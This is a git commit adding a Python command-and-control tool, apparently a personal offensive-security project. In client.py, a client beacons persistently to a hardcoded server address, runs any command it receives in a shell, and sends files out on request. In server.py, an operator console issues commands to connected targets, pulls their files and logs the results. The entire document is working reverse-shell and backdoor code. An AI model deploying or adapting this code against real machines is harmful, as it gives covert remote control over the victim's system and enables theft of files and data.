f309357952d42e530bb4e3684906c506d12963f7
Ofek Vardi <ofekvar1@gmail.com>
2022-05-07 20:53:16 +0300

    Upload updated project to github

---
+++ client.py
@@ -0,0 +1,236 @@
+#!/usr/bin/python3
+
+import socket
+import os
+import pathlib
+import hashlib
+import time
+import random
+import subprocess
+
+SERVER_IP = "192.168.247.128"  # Remote address
+PORT = 1234  # Remote port
+FORMAT = "utf-8"  # Message encoding format
+HEADER_SIZE = 10  # Message header size
+MAX_CONSECUTIVE = 5  # Max consecutive connection attempts
+SEGMENT_SIZE = 1024  # Segment size when downloading / uploading files
+TIMEOUT = 1  # Socket timeout when downloading / uploading files
+COOLDOWN = (1, 1)  # Range of time to sleep between consecutive connection attempts (In seconds)
+HIBERNATE = (1, 1)  # Range of time to hibernate after reaching maximum retries / Identifying a used port
+COMMAND_TIMEOUT = 10  # Time limit for command execution on the client side
+DOWNLOADS = pathlib.Path(__file__).parent
+
+
+def get_file_hash(data: list[bytes]) -> str:
+    md5 = hashlib.md5()
+    for chunk in data:
+        md5.update(chunk)
+    return md5.hexdigest()
+
+
+def upload_file(sock: socket.socket, path: str) -> None:
+    # Implemented segmentation when reading / sending file data to avoid memory overload
+    path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
+    try:
+        # Read target file in segments
+        data = []
+        with open(path, "rb") as f:
+            chunk = f.read(SEGMENT_SIZE)
+            while chunk:
+                data.append(chunk)
+                chunk = f.read(SEGMENT_SIZE)
+        sock.send("1".ljust(HEADER_SIZE).encode(FORMAT))  # Signal: File contents were successfully read
+
+        # Calculate & send file hash, later used for integrity verifications on server side
+        md5 = get_file_hash(data)
+        sock.send(md5.encode(FORMAT))
+
+        # Send segmented file data
+        for segment in data:
+            if segment:
+                sock.send(segment)
+    except (FileNotFoundError, IOError):  # Signal: Error when trying tor ead from target file
+        sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
+
+
+def download_file(sock: socket.socket, path: str) -> None:
+    # Implemented segmentation when writing / receiving file data to avoid memory overload
+    file_name = pathlib.Path(path).name  # File name without the full path
+    dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
+    original = sock.gettimeout()
+    sock.settimeout(TIMEOUT)  # Set requested timeout
+    original_md5 = ""
+    data = []
+    result = ""
+    message = ""
+    try:
+        # Get client side status
+        readable_src_file = int(sock.recv(HEADER_SIZE).decode(FORMAT))
+        if readable_src_file:  # File was read successfully on client side
+            # Get original file hash
+            original_md5 = sock.recv(32).decode(FORMAT)
+
+            # Receive segmented file contents and write to destination file
+            with open(dst, "wb") as f:
+                segment = sock.recv(SEGMENT_SIZE)
+                while segment:  # Keep receiving data until timeout
+                    f.write(segment)
+                    data.append(segment)  # Save written data for hash calculation
+                    segment = sock.recv(SEGMENT_SIZE)
+        else:  # Error finding / reading file on client side
+            result = "0"
+            message = "ERROR"
+    except socket.timeout:  # Reached timeout, proceed to check file integrity
+        # Calculate downloaded file hash
+        result_md5 = get_file_hash(data)
+        # Integrity verification
+        if result_md5 == original_md5:
+            # Successful download
+            result = "1"
+            message = file_name
+        else:
+            # Timeout reached before completing the download
+            result = "0"
+            message = "TIMEOUT"
+    finally:
+        # Send final result and message to the server side
+        sock.send(result.ljust(SEGMENT_SIZE).encode(FORMAT))
+        sock.send(message.ljust(SEGMENT_SIZE).encode(FORMAT))
+        # Reset timeout value
+        sock.settimeout(original)
+
+
+def run_msg(msg: str) -> str:
+    """This function runs messages received from the server as bash commands on the local system.
+
+    :param msg: Message from the server in clear text
+    :return: Bash command output
+    """
+    # Command execution attempt
+    try:
+        output = subprocess.run(rf"{msg}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                timeout=COMMAND_TIMEOUT)
+        return output.stdout.decode()
+    except subprocess.TimeoutExpired as err:
+        return str(err)
+
+
+def send_output(sock: socket.socket, msg: str) -> None:
+    """This function receives a message, runs it as a bash command on the local system,
+    and sends its output back to the server.
+
+    :param sock: Socket established with the server
+    :param msg: Bash command to run
+    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
+    :type msg: str
+    :return: None
+    """
+    # Attempt to change directory
+    if msg[:3] == "cd ":
+        path = msg[3:]
+        try:
+            os.chdir(path)
+            output = ""  # Send an empty message upon success
+        except FileNotFoundError:  # Unrecognized directory specified
+            output = f"[!] ERROR: Directory {path} doesn't exist"
+    else:
+        output = run_msg(msg)
+
+    # Send the message to the client, prefixed by a header of a set size
+    # The header contains the message length padded by spaces (Used to ensure connection reliability)
+    # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
+    msg_len = len(output)
+    sock.send((f"{msg_len:<{HEADER_SIZE}}" + output).encode(FORMAT))
+
+
+def recv_msg(sock: socket.socket) -> str:
+    """This function receives bash commands from the server.
+
+    :param sock: Socket established with the server
+    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
+    :return: Bash commands from the server in clear text
+    :rtype: str
+    """
+    try:
+        # Only receive the header and extract the message length
+        msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
+        # Receive & return the message in its entirety
+        return sock.recv(msg_len).decode(FORMAT)
+    except ValueError:
+        return ""
+
+
+def shell(sock: socket.socket) -> None:
+    # Command line interface
+    orig = sock.gettimeout()
+    sock.settimeout(COMMAND_TIMEOUT)
+    while sock:
+        try:
+            msg_from_server = recv_msg(sock)
+        except socket.timeout:
+            print("t")
+            continue
+        # For certain keywords, run the appropriate action
+        if msg_from_server in ["quit", "exit"]:  # Server side connection termination signal
+            sock.close()
+            break
+        elif msg_from_server == "clear":  # Server side console clear screen (Ignored on client side)
+            pass
+        elif msg_from_server[:9] == "download ":  # Server side file download signal
+            upload_file(sock, msg_from_server[9:])
+        elif msg_from_server[:7] == "upload ":  # Server side file upload signal
+            download_file(sock, msg_from_server[7:])
+        elif msg_from_server:  # Any other command
+            send_output(sock, msg_from_server)
+    sock.settimeout(orig)
+
+
+def establish_connection(sock: socket.socket, consecutive_connections: int) -> int:
+    # Connection attempt to server side
+    try:
+        sock.connect((SERVER_IP, PORT))
+        shell(sock)
+    except ConnectionError:  # No listener found
+        # Count consecutive connection attempts
+        if consecutive_connections < MAX_CONSECUTIVE:
+            consecutive_connections += 1
+            print("sleep 1")
+            time.sleep(random.randint(COOLDOWN[0], COOLDOWN[1]))
+        else:  # Reached maximum consecutive connections allowed, going to sleep...
+            consecutive_connections = 1
+            print("hibernate 1")
+            time.sleep(random.randint(HIBERNATE[0], HIBERNATE[1]))
+    except OSError as err:  # Required port is already in use
+        print(f"{err = }")
+        time.sleep(random.randint(HIBERNATE[0], HIBERNATE[1]))
+    except KeyboardInterrupt:
+        pass
+    finally:
+        return consecutive_connections
+
+
+def main() -> None:
+    """This is the main function for the C&C client side.
+
+    :return: None
+    """
+    consecutive_connections = 1
+    s = ""
+    # Establish client side
+    while True:  # 24/7 Beacon attempts once executed
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable address reuse
+            consecutive_connections = establish_connection(s, consecutive_connections)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            if s:
+                s.close()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        pass
---
+++ server.py
@@ -0,0 +1,329 @@
+#!/usr/bin/python3
+
+import socket
+import os
+import platform
+import pathlib
+import hashlib
+import datetime
+import termcolor
+
+# TODO:
+#   1. Broadcast utility overhaul
+#   2. Log file utility overhaul
+#   3. Threads and locks implementation
+#   4. Add 'offensive-python' project utilities:
+#       a. Display alert when client is visiting a blacklisted website
+#       b. Send heartbeat from client to server to verify it is alive
+#       c. Display alert when duplicate mac address is found in the client's ARP table
+#       d. Log all alerts as events (Should include: When, where & what happened)
+#   5. Encryption implementation
+#   6. Send platform data from client to sever upon request
+#   7. Go over function docstrings
+#   8. Read global variable values from file upon flag usage
+
+SERVER_IP = "0.0.0.0"  # Remote address
+PORT = 1234  # Remote port
+FORMAT = "utf-8"  # Message encoding format
+HEADER_SIZE = 10  # Message header size
+MAX_CONSECUTIVE = 5  # Max consecutive connection attempts
+SEGMENT_SIZE = 1024  # Segment size when downloading / uploading files
+TIMEOUT = 1  # Socket timeout when downloading / uploading files
+LOG_PATH = str(pathlib.Path(__file__).parent.joinpath("c2.log"))  # Log file path
+DOWNLOADS = pathlib.Path(__file__).parent  # Downloaded files destination path
+CLIENTS = []  # Target list
+
+
+def clr(msg):
+    """This function colors messages according to their content.
+
+    :param msg: Message received in clear text
+    :type msg: str
+    :return: Recolored message in clear text
+    :rtype: str
+    """
+    if msg[:3] == "[+]":  # Success indication
+        return termcolor.colored(msg, "green")
+    elif msg[:3] == "[*]":  # Informative message indication
+        return termcolor.colored(msg, "yellow")
+    else:  # Failure indication / Anything else
+        return termcolor.colored(msg, "red")
+
+
+def get_file_hash(data: list[bytes]) -> str:
+    md5 = hashlib.md5()
+    for chunk in data:
+        md5.update(chunk)
+    return md5.hexdigest()
+
+
+def download_file(sock: socket.socket, path: str) -> None:
+    # Implemented segmentation when writing / receiving file data to avoid memory overload
+    file_name = pathlib.Path(path).name  # File name without the full path
+    dst = str(DOWNLOADS.joinpath(file_name))  # Create destination file full path
+    original = sock.gettimeout()
+    sock.settimeout(TIMEOUT)  # Set requested timeout
+    original_md5 = ""
+    result = ""
+    data = []
+    try:
+        # Get client side status
+        readable_src_file = int(sock.recv(HEADER_SIZE).decode(FORMAT))
+        if readable_src_file:  # File was read successfully on client side
+            # Get original file hash
+            original_md5 = sock.recv(32).decode(FORMAT)
+
+            # Receive segmented file contents and write to destination file
+            with open(dst, "wb") as f:
+                segment = sock.recv(SEGMENT_SIZE)
+                while segment:  # Keep receiving data until timeout
+                    f.write(segment)
+                    data.append(segment)  # Save written data for hash calculation
+                    segment = sock.recv(SEGMENT_SIZE)
+        else:  # Error finding / reading file on client side
+            result = "FAILURE: FileNotFoundError / IOError"
+            print(clr("[!] ERROR: File doesn't exist / Access denied"))
+    except socket.timeout:  # Reached timeout, proceed to check file integrity
+        # Calculate downloaded file hash
+        result_md5 = get_file_hash(data)
+        # Integrity verification
+        if result_md5 == original_md5:
+            result = f"SUCCESS: {dst}"
+            print(f"{clr('[+] Download successful -')} {dst}")
+        else:
+            result = "FAILURE: Session timeout"
+            print(clr("[!] ERROR: Timeout reached while downloading the file"))
+    finally:
+        sock.settimeout(original)  # Reset timeout value
+        # Log attempt + result
+        with open(LOG_PATH, "a") as log:
+            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
+            log.write(f"{prefix}\tDownload attempt for {path}, {result}\n")
+
+
+def upload_file(sock: socket.socket, path: str) -> None:
+    # Implemented segmentation when reading / sending file data to avoid memory overload
+    path = str(pathlib.Path(path).resolve())  # Absolute path (Resolve symlinks)
+    log_result = ""
+    try:
+        # Read target file in segments
+        data = []
+        with open(path, "rb") as f:
+            chunk = f.read(SEGMENT_SIZE)
+            while chunk:
+                data.append(chunk)
+                chunk = f.read(SEGMENT_SIZE)
+        sock.send("1".ljust(HEADER_SIZE).encode(FORMAT))  # Signal: File contents were successfully read
+
+        # Calculate & send file hash, later used for integrity verifications on server side
+        md5 = get_file_hash(data)
+        sock.send(md5.encode(FORMAT))
+
+        # Send segmented file data
+        for segment in data:
+            if segment:
+                sock.send(segment)
+    except (FileNotFoundError, IOError):  # Signal: Error when trying tor ead from target file
+        sock.send("0".ljust(HEADER_SIZE).encode(FORMAT))
+    finally:
+        # final result and message from the client side
+        result = int(sock.recv(SEGMENT_SIZE).decode(FORMAT))
+        message = sock.recv(SEGMENT_SIZE).decode(FORMAT).strip()
+        if result:  # Successful upload
+            dst = str(DOWNLOADS.joinpath(message))
+            print(f"{clr('[+] Upload successful -')} {dst}")
+            log_result = f"SUCCESS: {dst}"
+        else:  # Upload failed
+            # Print relevant error to match the final message received from the client side
+            if message == "TIMEOUT":
+                print(clr("[!] ERROR: Timeout reached while uploading the file"))
+                log_result = "FAILURE: Session timeout"
+            elif message == "ERROR":
+                print(clr("[!] ERROR: File doesn't exist / Access denied"))
+                log_result = "FAILURE: FileNotFoundError / IOError"
+        # Log attempt + result
+        with open(LOG_PATH, "a") as log:
+            prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
+            log.write(f"{prefix}\tUpload attempt for {path}, {log_result}\n")
+
+
+def recv_msg(sock: socket.socket, command: str) -> None:
+    """This function receives a bash command output from the target and logs it within './c2.log'.
+
+    :param sock: Socket established with the target
+    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param command: Command executed on the client
+    :type command: str
+    :return: Bash command output received from the target in clear text
+    :rtype: str
+    """
+    try:
+        # Only receive the header and extract the message length
+        msg_len = int(sock.recv(HEADER_SIZE).decode(FORMAT))
+        # Receive the message in its entirety
+        output = sock.recv(msg_len).decode(FORMAT)
+        # Unrecognized command
+        if "is not recognized as an internal or external command" in output or "not found" in output:
+            print(clr("[!] ERROR: Command not found"))
+            print(clr('[*] HINT: The Target\'s OS is - ') + platform.system())
+        elif "timed out after" in output:  # Command execution timeout on target
+            print(clr("[!] ERROR: Command timed out"))
+        elif command[:3] == "cd " and output == "":  # Changed directory successfully on client side
+            pass
+        else:  # Successful command execution resulting in output
+            # Log command + output
+            with open(LOG_PATH, "a") as log:
+                # Log the command executed
+                prefix = datetime.datetime.now().strftime('%d/%m/%y %H:%M:%S')
+                log.write(f"{prefix}\t{command}\n")
+
+                # Log the output (indented)
+                for line in output.splitlines():
+                    log.write(f"{line}\n")
+
+            # Print output on server side
+            if output:
+                print(output.strip())
+    except ValueError:  # Received empty header (Client disconnected before sending a reply)
+        pass
+
+
+def send_msg(sock: socket.socket, command: str) -> None:
+    """This function sends a bash command to the target and prints its output.
+    It can also broadcast the bash command to all targets if needed by triggering the 'broadcast' function.
+
+    :param sock: Socket established with the target
+    :type sock: socket(socket.AF_INET, socket.SOCK_STREAM)
+    :param command: Command to run on client
+    :type command: str
+    :return: None
+    """
+    # FIXME
+    #     enable_broadcast = input(color_msg("[?] Would you like to broadcast your command? y/n ")).lower()
+    #     if enable_broadcast == "y":
+    #         broadcast(f"{msg_len:<{HEADER_SIZE}}" + msg)
+    pass  # Place holder until broadcast utility is fixed
+    # Send the message to the client, prefixed by a header of a set size
+    # The header contains the message length padded by spaces (Used to ensure connection reliability)
+    # Design flaw: Message size limit (E.g Message size limit of '9,999,999,999' if 'HEADER_SIZE' equals '10')
+    msg_len = len(command)
+    sock.send((f"{msg_len:<{HEADER_SIZE}}" + command).encode(FORMAT))
+
+    # Receive command output from the client side, if relevant
+    if command not in ["quit", "exit", "clear"] and command[:9] != "download " and command[:7] != "upload ":
+        recv_msg(sock, command)
+
+
+# FIXME
+#     def broadcast(msg):
+#         """This function broadcasts a message to all available clients.
+#         :param msg: Message in clear text
+#         :type msg: str
+#         :return: None
+#         """
+#         for client in CLIENTS:
+#             try:
+#                 client[0].send(msg.encode(FORMAT))
+#                 print(color_msg("[!] Communicating with ") + str(client[1]))
+#                 print(color_msg(recv_msg(client[0])))
+#             except:
+#                 print(color_msg("[!] Failed to send the message to - ") + str(client[1]))
+#         print(color_msg("[*] Message sent to all available clients"))
+
+
+def shell(sock: socket.socket, addr: tuple[str, int]) -> None:
+    try:
+        # Command line interface
+        while sock:
+            command = input(clr(f"TARGET@{addr}> "))  # Command to run on client side
+            if command:
+                send_msg(sock, command)
+                # For certain keywords, run the appropriate action
+                if command in ["quit", "exit"]:  # Quit current client CLI
+                    break
+                elif command[:3] == "cd ":  # Change directory on the client side
+                    pass
+                elif command == "clear":  # Clear server side console screen
+                    os.system("clear")
+                elif command[:9] == "download ":  # Download specified file from client side to server side
+                    download_file(sock, command[9:])
+                elif command[:7] == "upload ":  # Download specified file from server side to client side
+                    upload_file(sock, command[9:])
+    except ConnectionError as err:  # Socket connection error
+        print(f"{clr('[!] ERROR: Current socket is no longer valid -')} {err}")
+    finally:  # Always close sockets when done
+        if sock:
+            sock.close()
+
+
+def establish_connection(s: socket.socket) -> None:
+    s.listen(5)
+    sock = ""
+    try:
+        while True:
+            print(f"\n{clr('[*] Listening for incoming connections...')}")
+            sock, addr = s.accept()
+            # FIXME
+            #     Broadcast related
+            #     if (sock, addr) not in CLIENTS:
+            #         CLIENTS.append((sock, addr))
+            print(clr("[+] Connected to ") + str(addr))
+            # Start a command line interface for the current client
+            shell(sock, addr)
+
+            # Wait for instructions after terminating the current connection
+            instruction = input(clr("[*] Would you like to stop listening for incoming connections? y/n "), ).lower()
+            if instruction == "y":  # Terminate server side
+                break
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if sock:
+            sock.close()
+
+
+def main() -> None:
+    """
+    This is the main function for the C&C server side.
+
+    :return: None
+    """
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Enable address reuse
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    # Establish server side
+    s.bind((SERVER_IP, PORT))
+    try:
+        establish_connection(s)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if s:
+            s.close()
+        print("""\n
+             ██████   ██████   ██████  ██████  ██████  ██    ██ ███████ 
+            ██       ██    ██ ██    ██ ██   ██ ██   ██  ██  ██  ██      
+            ██   ███ ██    ██ ██    ██ ██   ██ ██████    ████   █████   
+            ██    ██ ██    ██ ██    ██ ██   ██ ██   ██    ██    ██      
+             ██████   ██████   ██████  ██████  ██████     ██    ███████""")
+
+
+if __name__ == "__main__":
+    print("""
+     ██████    ██     ██████     ██████  ██████   ██████       ██ ███████  ██████ ████████
+    ██         ██    ██          ██   ██ ██   ██ ██    ██      ██ ██      ██         ██
+    ██      ████████ ██          ██████  ██████  ██    ██      ██ █████   ██         ██
+    ██      ██  ██   ██          ██      ██   ██ ██    ██ ██   ██ ██      ██         ██
+     ██████ ██████    ██████     ██      ██   ██  ██████   █████  ███████  ██████    ██
+
+
+
+    ███████ ███████ ██████  ██    ██ ███████ ██████      ███████ ██ ██████  ███████
+    ██      ██      ██   ██ ██    ██ ██      ██   ██     ██      ██ ██   ██ ██
+    ███████ █████   ██████  ██    ██ █████   ██████      ███████ ██ ██   ██ █████
+         ██ ██      ██   ██  ██  ██  ██      ██   ██          ██ ██ ██   ██ ██
+    ███████ ███████ ██   ██   ████   ███████ ██   ██     ███████ ██ ██████  ███████""")
+    try:
+        main()
+    except KeyboardInterrupt:
+        pass
